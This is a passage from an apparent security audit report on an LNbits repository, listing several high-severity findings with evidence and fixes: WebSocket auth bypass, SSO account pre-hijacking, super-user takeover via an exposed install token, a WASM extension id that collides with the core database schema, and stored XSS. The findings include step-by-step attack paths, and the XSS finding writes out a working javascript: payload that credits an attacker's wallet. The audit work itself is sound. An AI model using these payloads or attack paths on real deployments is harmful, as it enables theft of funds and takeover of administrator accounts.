6. [lnbits/decorators.py:642–664](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L642-L664)
   check_blockexplorer_public (public page only when lnbits_blockexplorer_public_api) and check_blockexplorer_access (otherwise a logged-in user via check_user_exists) gate the explorer HTML pages in generic.py:236-255 the same way the REST routes are gated, confirming the intended policy that the WS routes bypass.

## Impact
Confidentiality NONE: what the anonymous client obtains (address balance/history, tx confirmation status, new blocks) is public chain data; nothing about LNbits, its users or the operator is disclosed, so the bypass defeats the admin's access restriction without a confidentiality loss to the system. Integrity NONE. Availability LOW: the unauthenticated, unrate-limited /ws/tx route allocates one tracker task and one outbound TLS session per attacker-chosen txid, each re-handshaking every 10 s for as long as the idle socket is held, consuming process tasks, file descriptors and the operator's Electrum quota (Blockstream's public server by default; a rate-limited or banned backend also degrades LNbits' own on-chain wallet tracking that shares that server).

## Reproduction steps
1. Any network client connects to wss://<lnbits>/blockexplorer/api/v1/ws/address/<addr> or /ws/tx/<anything> on a default install (lnbits_blockexplorer_enabled True, lnbits_blockexplorer_public_api False). The socket is accepted with no credentials and relays Electrum data; for /ws/tx each distinct txid string spawns a dedicated TransactionTracker task that opens its own outbound Electrum connection and, when the server rejects the txid, sleeps 10 s with the connection open and reconnects for as long as the socket is held. No user interaction or special conditions. Assumption: SlowAPIMiddleware (slowapi~=0.1.9) is a Starlette BaseHTTPMiddleware (starlette~=0.48.0) and is only applied to scope type 'http', so lnbits_rate_limit_* (default 200/minute) and the @app.middleware('http') IP block list do not apply to WebSocket upgrades.

## Recommended fix
1. The WebSocket handlers do not apply the access policy (lnbits_blockexplorer_public_api / logged-in user) that every other block explorer API route and page enforces. Fix criteria: With lnbits_blockexplorer_public_api False, an unauthenticated WebSocket connection to any /blockexplorer/api/v1/ws/* route is rejected before accept() (or closed immediately with a policy code), and an authenticated user's connection succeeds; with the flag True anonymous access continues to work.
2. ws_tx accepts an arbitrary txid and allocates an unbounded number of per-txid trackers, each with its own outbound Electrum connection and endless reconnect loop. Fix criteria: txid is validated as 64 lowercase hex characters before any tracker is created; trackers whose transaction the server does not know stop after a bounded number of attempts; the number of concurrent WS subscriptions per client/IP is bounded.

---
**Severity:** HIGH
**Status:** Open
**Category:** Auth bypass
**CWE:** [CWE-288](https://cwe.mitre.org/data/definitions/288.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257396

---

# SSO login merges into existing account by unverified self-declared email (account pre-hijacking)

## Details
Holds on deployments where the operator has enabled an SSO provider (google/github/keycloak/oidc in `auth_allowed_methods`) while leaving the default `username-password` method on — the combination docs/guide/oidc-authentication.md documents under 'Multiple Auth Methods'.

The SSO callback `GET /api/v1/auth/{provider}/token` ends in `_handle_sso_login` (lnbits/core/views/auth_api.py:661-687), which selects the LNbits account by email equality alone: `account = await get_account_by_email(email, active_only=False)`; if found, it sets `extra.email_verified = True` and calls `_login_response(account)` (:855-885), issuing `cookie_access_token`/`is_lnbits_user_authorized` for that account. The email on a password account is self-declared: `POST /api/v1/auth/register` (:460-492, anonymous, default-enabled) stores any syntactically valid address, and `create_user_account_no_ckeck` (lnbits/core/services/users.py:62-68) checks only uniqueness among active accounts. No verification exists anywhere: `lnbits_user_activation_by_email` (settings.py:60) has no backend consumer, `check_register_activation_settings` handles only invitation codes, and `UserExtra.email_verified` is consulted by no code path (it is also user-writable via PATCH /api/v1/auth, so it could not serve as a gate). Register is the only user-reachable producer of `accounts.email` (`UpdateUser` has no email field; `user_api.py` routes are admin-only).

Account pre-hijacking (classic federated-merge): an anonymous attacker who knows a target's address registers `username=x, email=victim@example.com` before the victim first uses the instance. When the victim later clicks 'Login via Google/GitHub/Keycloak/OIDC', the IdP returns `victim@example.com`, `_handle_sso_login` finds the attacker's account and logs the victim into it. The victim sees a working account (the UI shows the email as verified); every wallet they create, invoice they issue and sat they receive lives in an account whose password the attacker holds, so the attacker can read the payment history and spend the balance at any time with their own password login. The reverse direction (attacker brings an IdP identity carrying the victim's address) depends on the IdP asserting only verified emails — fastapi-sso 0.19.0's OpenID carries `email` without an `email_verified` claim (assumption from the pinned dependency; not verified in this checkout) — and LNbits performs no check of its own either way.

The repository test tests/api/test_auth_api.py::test_auth_api_sso_login_and_callback exercises exactly this lookup-by-email merge path.

## Evidence
1. [lnbits/core/views/auth\_api.py:661–686](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L661-L686)
   _handle_sso_login resolves the account to log into purely by `get_account_by_email(userinfo.email, active_only=False)`; if an account with that email exists it is marked email_verified=True and handed to _login_response. Nothing checks how that account's email was set, whether it was ever verified, or whether the IdP asserted the address as verified.
2. [lnbits/core/views/auth\_api.py:460–491](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L460-L491)
   POST /api/v1/auth/register (anonymous; username-password is the default auth method) stores any syntactically valid `email` the caller supplies on the new account. This is the only user-reachable path that sets accounts.email (UpdateUser has no email field; admin user_api routes require check_admin).
3. [lnbits/core/services/users.py:62–67](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L62-L67)
   create_user_account_no_ckeck checks only that the email is not held by another active account; there is no verification step (no mail is sent, no token issued), so the stored address is a bare self-declaration.
4. [lnbits/core/views/auth\_api.py:855–884](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L855-L884)
   _login_response issues a full session (cookie_access_token, is_lnbits_user_authorized) for whatever account the email match selected, so the SSO user is logged straight into the pre-registered account.
5. [lnbits/settings.py:944–955](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L944-L955)
   auth_allowed_methods is a list; username-password is the default and SSO methods are added alongside it (docs/guide/oidc-authentication.md 'Multiple Auth Methods' shows `username-password,oidc-auth,keycloak-auth`). _new_sso gates the SSO routes on this list, so the attack needs an operator who enabled an SSO provider without disabling password registration.
6. [lnbits/settings.py:58–61](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L58-L61)
   lnbits_user_activation_by_email exists as a setting but has no consumer in the backend (check_register_activation_settings handles only invitation codes), so no email-verification control ships that could gate the merge.

## Impact
The victim's entire LNbits presence — wallets, admin/invoice keys, payment history and balance — is created inside an account whose password the attacker holds, crossing the user↔user boundary; the attacker can read everything and spend all funds. Availability is not meaningfully affected.

## Reproduction steps
1. Anonymous network attacker who knows (or guesses) a target's email address registers one password account (open registration is the default). Requires the operator to have enabled an SSO provider alongside username-password (a documented, non-default configuration: AT:P) and the victim to later perform a routine first SSO login (UI:P). No control is bypassed because none exists on this path.

## Recommended fix
1. Federated login merges into an existing local account on email equality even though local emails are self-declared and never verified, so whoever first claims an address owns any later SSO user with that address. Fix criteria: An SSO identity is merged into a local account only when the local address was verified through a trusted channel (a verified-email assertion from the IdP matched against a locally verified address, or an explicit link performed while authenticated to the local account); otherwise a new account is created or the login is refused with a clear message. Verify: register with an email, then complete SSO with the same email and confirm no session for the pre-registered account is issued.
2. The email_verified flag is accepted wholesale from PATCH /api/v1/auth and set by the link flow without comparing the IdP address to the stored address, so it cannot be used as the gate above. Fix criteria: email_verified is server-controlled (ignored in PATCH /api/v1/auth) and set only when the IdP-asserted address equals the account's stored address. Verify: PATCH with extra.email_verified=true leaves the flag unchanged, and the link flow with a mismatched IdP email leaves it false.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper authentication
**CWE:** [CWE-287](https://cwe.mitre.org/data/definitions/287.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257395

---

# Any admin can read FIRST_INSTALL_TOKEN from first_install_token_confirmed, overwrite it to force a super-user reset at next start, and claim the new super user

## Details
first_install_token_confirmed (settings.py:490) is declared in SecuritySettings, a base of EditableSettings, so it is both returned by GET /admin/api/v1/settings (AdminSettings extends EditableSettings; get_admin_settings in crud/settings.py:36-50 removes only super_user and auth_all_methods) and accepted by PUT/PATCH /admin/api/v1/settings (UpdateSettings; admin_api.py:103-150, 224-235), all guarded by check_admin only. The field is internal bookkeeping: auth_api.first_install() (621-658) writes it after the operator completes the first-install flow, and the value it stores is data.first_install_token, which at line 629 was required to equal the env secret FIRST_INSTALL_TOKEN. The stored 'confirmation' is therefore the secret itself.

Attack, by any non-super admin (lnbits_admin_users), on a deployment that configured FIRST_INSTALL_TOKEN:
1. GET /admin/api/v1/settings → read first_install_token_confirmed = the real FIRST_INSTALL_TOKEN.
2. PUT /admin/api/v1/settings {"first_install_token_confirmed": "x"} → persisted by update_admin_settings and applied live (200 OK; no per-field authorization).
3. At the next process start (app.py:100 → check_admin_settings, users.py:178-192) the DB value is loaded, has_first_install_token_changed() (settings.py:1195-1200) is True, and init_admin_settings() with no super_user creates a fresh provider='env' account, records it as super_user and sets settings.first_install = True. The former super user, not being in lnbits_admin_users, is silently demoted to an ordinary user; the attacker keeps admin because lnbits_admin_users is copied into the new row (users.py:211-212). The first-install middleware (middleware.py:235-246) redirects every request to /first_install.
4. PUT /api/v1/auth/first_install with the token read in step 1 and a chosen username/password: the check at 629 passes, the new super-user account receives the attacker's credentials and the attacker is logged in as super user (is_super_user == settings.super_user, settings.py:1366-1367). The attacker now holds everything the project withholds from admins: credit/debit of any wallet, restart, settings reset, data-folder backup (SQLite DB, .lnbits_auth_key — the JWT signing secret — and .lnbits_totp_key).

Even without completing step 4 (e.g. the operator wins the race to /first_install), steps 2-3 alone lock the instance for all users until the token holder completes setup and permanently demote the legitimate super-user account. The restart in step 3 is not attacker-triggerable (restart is check_super_user) but occurs routinely on upgrades, crashes and reboots. Precondition: FIRST_INSTALL_TOKEN set in the environment (opt-in, documented only in .env.example); without it has_first_install_token_changed() is always False and the field is unused.

## Evidence
1. [lnbits/settings.py:490](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L490)
   first_install_token_confirmed is declared in SecuritySettings, a base of EditableSettings, hence of UpdateSettings (accepted by PUT/PATCH) and of SuperSettings/AdminSettings (returned by GET). It is an internal bookkeeping field whose value is the secret FIRST_INSTALL_TOKEN itself; placing it here makes it both readable and writable by every admin. This is the code the fix must change.
2. [lnbits/core/crud/settings.py:36–49](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/settings.py#L36-L49)
   get_admin_settings builds AdminSettings from the stored row and removes only super_user and auth_all_methods, so first_install_token_confirmed (== FIRST_INSTALL_TOKEN after a completed first install) is returned to any admin, super or not.
3. [lnbits/core/views/auth\_api.py:621–657](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L621-L657)
   first_install(): when settings.first_install is set it requires data.first_install_token == settings.first_install_token (629), then sets username/password on get_account(settings.super_user) and logs the caller in (648-658); it persists data.first_install_token — the real env token — as first_install_token_confirmed (653-657). It is the only legitimate writer of that field and the endpoint the attacker uses to claim the regenerated super-user account.
4. [lnbits/core/views/admin\_api.py:95–149](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L95-L149)
   GET /admin/api/v1/settings (check_admin) returns AdminSettings including first_install_token_confirmed; PUT /admin/api/v1/settings (check_admin) applies a super-user check only to lnbits_allow_onchain_payments and persists every other UpdateSettings field via update_admin_settings and update_cached_settings, including first_install_token_confirmed.
5. [lnbits/core/views/admin\_api.py:224–234](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L224-L234)
   PATCH variant merges an arbitrary dict over the live settings and calls the same handler, so the field is writable through either route.
6. [lnbits/settings.py:1195–1200](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1195-L1200)
   has_first_install_token_changed() returns True whenever FIRST_INSTALL_TOKEN is configured and the DB-loaded first_install_token_confirmed is non-empty and differs from it; an admin-written value makes this True.
7. [lnbits/core/services/users.py:178–192](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L178-L192)
   At startup check_admin_settings loads the DB row into the live object (178) and then, on a changed token, calls init_admin_settings() with no super_user, assigns the fresh account as settings.super_user and sets settings.first_install = True (188-192); the legitimate super user (not in lnbits_admin_users) becomes an ordinary user.
8. [lnbits/core/services/users.py:200–212](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L200-L212)
   init_admin_settings creates a new uuid4 account with provider='env', a wallet, and writes super_user plus a copy of the live editable settings — including the attacker's lnbits_admin_users membership and the bogus confirmed token — as the new settings row.
9. [lnbits/middleware.py:235–245](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/middleware.py#L235-L245)
   While settings.first_install is set every request except /first_install, /api/v1/auth/first_install and /static is redirected to /first_install, locking the instance until someone completes the claim.
10. [lnbits/app.py:100](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L100)
   check_admin_settings() runs in the application startup path on every process start, so a routine restart (upgrade, crash, host reboot) is enough to trigger the reset.
11. [.env.example:9–11](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.env.example#L9-L11)
   FIRST_INSTALL_TOKEN is an opt-in env-only setting ('If set the user is required to enter this token on the /first_install page'); the finding holds only on deployments that configured it — the very deployments that opted into the hardening this field supports.

## Impact
Confidentiality: the FIRST_INSTALL_TOKEN secret is disclosed to every admin, and the resulting super-user session can download the data-folder backup containing the database, .lnbits_auth_key (mint any JWT) and .lnbits_totp_key. Integrity: the super-user identity is replaced, the legitimate super user is demoted, and the attacker gains credit/debit of any wallet, restart and settings reset. Availability: from the restart until the claim completes every request is redirected to /first_install — a total outage for all users — and the super-user session can restart or re-point the instance at will.

## Reproduction steps
1. Attacker is an authenticated non-super admin reachable over the network (PR:H). Two API calls (GET to read the confirmed token, PUT to overwrite it) succeed against a deployment that configured FIRST_INSTALL_TOKEN; nothing in the request path must be defeated (AC:L). Exploitation completes only after a process restart the attacker cannot trigger, requires the deployment to have set the opt-in FIRST_INSTALL_TOKEN, and the super-user claim races the operator who also sees the first-install page — victim-state conditions outside the attacker's control (AT:P). No user interaction is needed.

## Recommended fix
1. An internal bookkeeping field (first_install_token_confirmed) is part of the admin-editable settings model, so PUT/PATCH /admin/api/v1/settings lets any admin rewrite first-install state and trigger the token-changed reset at the next start. Fix criteria: first_install_token_confirmed must not be settable through PUT or PATCH /admin/api/v1/settings for any caller; only the first_install handler may write it. An admin request containing the field is rejected or the field is ignored, and has_first_install_token_changed() cannot be made true by API input.
2. The confirmation record stores the secret FIRST_INSTALL_TOKEN itself and the field is included in the AdminSettings model returned by GET /admin/api/v1/settings, disclosing the token to every admin. Fix criteria: The token is never returned by any settings API; the confirmation marker is stored as a non-secret value (for example a hash of the token or a boolean plus hash) that cannot be used to pass the /api/v1/auth/first_install token check, and GET /admin/api/v1/settings for a non-super admin contains no first-install token material.

---
**Severity:** HIGH
**Status:** Open
**Category:** Mass Assignment
**CWE:** [CWE-915](https://cwe.mitre.org/data/definitions/915.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257390

---

# WASM extension id 'public' maps its storage onto the PostgreSQL core schema

## Details
Extension databases are addressed by name: `Database(f"ext_{ext_id}")` sets `schema = ext_id` (lnbits/db.py:312-315) and `connect()` issues `CREATE SCHEMA IF NOT EXISTS {schema}` on PostgreSQL/CockroachDB (db.py:333-337). The core database is `Database("database")` (core/db.py) with `schema=None`, so core tables live in the default `public` schema. The WASM extension id — `CreateExtension.ext_id` from the admin install call, which must match an entry in a configured WASM manifest (`lnbits_wasm_extensions_manifests`) and the archive's `config.json` id — is validated only against `^[A-Za-z0-9_-]+$` (wasm/config.py:18,126); `ExplicitRelease.id`/`GitHubRelease.id` are plain `str`, and neither `install_extension()` (services/extensions.py:213-237) nor `Database` rejects reserved or pre-existing schema names. A WASM extension published with `id: "public"` therefore has its 'private' storage schema resolve to the core schema on PostgreSQL/CockroachDB deployments (the documented at-scale backend, docs/guide/installation.md:474).

Consequences, all reachable by the module through its ordinary, admin-approved host API:

1. Read of core tables through the sandbox. `storage/schema.json` and the `ext.storage.read_public` policy are authored by the extension itself; `_load_table_schema()` reads only that file (storage/crud.py:504-530) and `_public_storage_policy()` only the module's own policy list (api/host.py:823-855). Declaring a table `system_settings` with fields `id,value,tag`, the module calls `storage.get_public` (`require_auth=False`, host.py:152-175) with `id="super_user"`, `"lnd_rest_macaroon"`, `"clnrest_pay_rune"`, `"lnbits_admin_users"`, … → `storage_get_public_row('public','system_settings',id)` runs `SELECT * FROM public.system_settings WHERE id = :id` (crud.py:40-52) and returns the super-user id (a credential under user-id-only auth) and funding-source credentials. `storage.get_public_paginated` requires a module-chosen `source_id_field` filter (host.py:275-289); with `source_id_field="tag"`, `source_id="core"` it runs `SELECT * FROM public.system_settings WHERE tag = 'core' LIMIT 1000` (crud.py:194-235) and returns every editable setting; the same trick with `wallets`/`name`/`"LNbits wallet"` (the default wallet name, settings.py:299) returns `adminkey`/`inkey` of all default wallets, and `apipayments`/`status`/`"success"` returns preimages, bolt11s and memos across all wallets. Results flow back to the module, which can exfiltrate them through its `http.request` grant or render them in its UI. `_add_field_sql` additionally lets the module's migrations `ALTER TABLE public.<core table> ADD COLUMN` (crud.py:333-345).

2. Destruction of the core database by the admin's own cleanup action. If the module ships any storage migration, `migrate_wasm_extension_database()` (crud.py:253-271) runs `CREATE TABLE IF NOT EXISTS public.<t>` (a no-op for existing core tables) and `_update_wasm_migration_version()` (crud.py:711-720) writes `dbversions.db = 'public'`. When the admin later uninstalls with the 'also drop DB' option (static/js/pages/extensions.js:264-282 → `DELETE /api/v1/extension/public/db`, extension_api.py:890-903) the `dbversions` guard in `drop_extension_db('public')` passes and `DROP SCHEMA IF EXISTS public CASCADE` (crud/extensions.py:87-104) deletes every core table.

On SQLite the id maps to a separate file (`ATTACH 'data/ext_public.sqlite3' AS public`) so the collision does not occur. The defect is the id→schema mapping plus the absence of a reserved/existing-schema check at install; the WASM storage layer's `_require_identifier` checks only syntax, never collision with core.

## Evidence
1. [lnbits/db.py:292–315](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L292-L315)
   Database.__init__ derives the SQL schema name directly from the db name: for 'ext_<id>' the schema is '<id>'. Core uses Database('database') with schema None (default 'public' on PostgreSQL). Nothing rejects reserved or pre-existing names such as 'public'.
2. [lnbits/core/wasm\_ext/wasm/config.py:18](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/wasm/config.py#L18)
   The only id validation for WASM extensions: ^[A-Za-z0-9_-]+$ (applied at :126). 'public' passes; manifest models (ExplicitRelease.id, GitHubRelease.id) are plain str.
3. [lnbits/core/services/extensions.py:213–236](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/extensions.py#L213-L236)
   install_extension() accepts the manifest-supplied id after validate_wasm_extension_permissions() and calls migrate_extension_database(ext_info), which for WASM instantiates Database(f'ext_{ext.id}'). No check that the id is not an existing/reserved schema.
4. [lnbits/core/wasm\_ext/api/host.py:152–175](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/api/host.py#L152-L175)
   storage.get_public (permission ext.storage.read_public, require_auth=False) calls storage_get_public_row(self.extension_id, table, id) filtered only by the module's own public_fields policy (_public_storage_policy, :823-855). With extension_id 'public' and table 'system_settings', id 'super_user' / 'lnd_rest_macaroon' returns core secrets.
5. [lnbits/core/wasm\_ext/storage/crud.py:40–52](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L40-L52)
   storage_get_public_row runs SELECT * FROM {ext_id}.{table} WHERE id = :id with the table schema loaded from the extension's own storage/schema.json (_load_table_schema, :504-530). With ext_id 'public' this reads public.system_settings / public.wallets / public.accounts rows by primary key.
6. [lnbits/core/wasm\_ext/storage/crud.py:194–235](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L194-L235)
   storage_get_public_paginated_rows runs SELECT * FROM {ext_id}.{table} WHERE <source_id_field> = :source_id LIMIT 1000; the filter column is chosen by the module's own policy (host.py:275-289), e.g. system_settings.tag='core', wallets.name='LNbits wallet', apipayments.status='success', so whole core tables are read with no owner constraint.
7. [lnbits/core/wasm\_ext/storage/crud.py:253–271](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L253-L271)
   migrate_wasm_extension_database() uses Database(f'ext_{ext.id}') and, via _update_wasm_migration_version (:711-720), writes a dbversions row keyed by ext.id — the row that unlocks drop_extension_db for 'public'.
8. [lnbits/core/wasm\_ext/storage/crud.py:306–344](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L306-L344)
   _create_table_sql emits CREATE TABLE IF NOT EXISTS public.<table> (a no-op for existing core tables, so migrations succeed) and _add_field_sql emits ALTER TABLE public.<table> ADD COLUMN, so the module can also alter core tables.
9. [lnbits/core/crud/extensions.py:87–104](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/extensions.py#L87-L104)
   drop_extension_db() trusts any ext_id that has a dbversions row and executes DROP SCHEMA IF EXISTS {ext_id} CASCADE on PostgreSQL. With ext_id='public' (reached from the admin's uninstall-and-drop-DB action, DELETE /api/v1/extension/public/db) this drops the entire core database.

## Impact
Disclosure of the super-user id (a credential under user-id-only auth), all editable settings including funding-source macaroons/runes/API tokens, every wallet's adminkey/inkey, account password hashes and all payments (confidentiality HIGH); wallet admin keys and the super-user id allow spending every wallet and full administrative control (integrity HIGH); the admin's drop-DB action executes DROP SCHEMA public CASCADE destroying the whole database (availability HIGH). Subsequent-system impact: system_settings holds the funding-source credentials (LND macaroons, CLN runes, hosted-API tokens), so the leaked data reaches the operator's Lightning node or custodial account outside LNbits.

## Reproduction steps
1. The attacker publishes a WASM extension with id 'public' in a manifest the operator has configured (lnbits_wasm_extensions_manifests), or gets such an entry accepted into one; the admin installs it through the normal UI and approves its requested storage permissions, a conscious action on an extension that looks like any other sandboxed module (UI:ACTIVE). The instance must run on PostgreSQL/CockroachDB, the documented at-scale backend (AT:PRESENT). From then on the module's ordinary storage.get_public / get_public_paginated calls return core system_settings, wallets, accounts and apipayments rows; a later admin uninstall-with-drop-DB drops the core schema. The attacker holds no LNbits credentials (PR:NONE) and acts remotely (AV:NETWORK).

## Recommended fix
1. The extension id is used verbatim as a PostgreSQL schema name with no check against reserved or already-existing schemas, so an extension named 'public' shares the core schema. Fix criteria: Extension ids must be rejected (at manifest parsing and in install_extension) when they equal 'public', 'pg_catalog', 'information_schema', 'core', 'main', 'temp' or any schema that already exists and does not belong to that extension; alternatively prefix extension schemas (e.g. 'ext_<id>') so they can never coincide with core. Verify that installing a WASM extension with id 'public' fails before any migration runs.
2. drop_extension_db() derives the schema to DROP ... CASCADE from the extension id, guarded only by a dbversions row that the extension's own migration creates. Fix criteria: The drop target must be the extension's dedicated schema, never a core/reserved schema, and should be refused when the schema contains core tables. Verify DELETE /api/v1/extension/public/db cannot drop the core schema.
3. WASM storage queries address '{ext_id}.{table}' by name, trusting that the schema is private to the extension. Fix criteria: WASM storage should operate only on tables it created (tracked ownership) within a schema guaranteed distinct from core; verify a module declaring a table named 'wallets' cannot read core wallet rows.

---
**Severity:** HIGH
**Status:** Open
**Category:** Incorrectly-resolved name
**CWE:** [CWE-706](https://cwe.mitre.org/data/definitions/706.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257388

---

# Admin-editable ad-space URLs bound to href without scheme check enable stored XSS

## Details
lnbits_ad_space and lnbits_ad_space_enabled are ThemesSettings fields in EditableSettings (settings.py:323-326), writable by any admin (not only the super user) through PUT /admin/api/v1/settings, which is gated by check_admin alone (admin_api.py:103-150) and applies super-user checks only to lnbits_allow_onchain_payments and the two-factor policy. No pydantic validator constrains lnbits_ad_space; set_settings_field json.dumps the raw string into system_settings and update_cached_settings puts it straight back on the live settings object. PublicSettings.from_settings() (settings.py:1473-1477) splits it on ',' and ';' into adSpace = [[url, img_dark, img_light], ...] with no URL-scheme check, template_renderer() publishes to_public() as the SETTINGS global on every request (helpers.py:79), and base.html emits it into the page's JS (base.html:89). home.vue (public '/', :164-171) and wallet.vue (every user's '/wallet', :250-253) render each entry as <a :href="ad[0]"> inside v-for. The shipped Vue 3.5.44 bundle (static/vendor/vue.global.prod.js) sets bound href attributes verbatim and performs no URL sanitisation, and pages served from base.html carry no Content-Security-Policy (the only CSP in generic.py:79 applies to extension-builder preview files; app.py adds no security-header middleware), so a javascript: URL executes on click.

An admin PUTs lnbits_ad_space = 'javascript:fetch("/users/api/v1/balance",{method:"PUT",headers:{"content-type":"application/json"},body:JSON.stringify({id:"<attacker wallet>",amount:100000000})});//;/static/images/bitcoin-shop-banner.png;/static/images/bitcoin-shop-banner.png' with lnbits_ad_space_enabled=true. The banner then appears on the public home page and inside every logged-in user's wallet page, including the super user's. When the super user clicks it, the script runs in the LNbits origin; same-origin fetch carries the httpOnly cookie_access_token (decorators.py:251-256 accepts the cookie), so the admin reaches the operations docs/guide/super_user.md reserves to the SU and check_super_user enforces: PUT /users/api/v1/balance (credit any wallet by an arbitrary amount, user_api.py:398-420), GET /admin/api/v1/backup (data folder with .lnbits_auth_key, .lnbits_totp_key, .super_user and the database), PUT /users/api/v1/user/{id}/admin, GET /admin/api/v1/restart, and funding-source changes. The gain is the admin -> super-user boundary the threat model names as a breach: admins already obtain every ordinary user's wallet keys through the sanctioned GET /users/api/v1/user/{id}/wallet (copy_with_keys(keep=True) for a non-ACL admin session), so clicks by ordinary users add nothing the project does not already concede to admins; the finding rests on the super-user victim. The ad space is documented as a brand/image slot ('Advertisement image filepaths in CSV format', en.js:1006-1007), not as a channel for executable URLs.

## Evidence
1. [lnbits/settings.py:323–326](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L323-L326)
   lnbits_ad_space (free-form 'url;img;img,...' string) and lnbits_ad_space_enabled are ThemesSettings fields in EditableSettings, writable by any admin; the field has no validator constraining the URL scheme.
2. [lnbits/settings.py:1473–1477](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1473-L1477)
   from_settings splits the string into adSpace URL lists without validating the scheme and exposes it in PublicSettings.
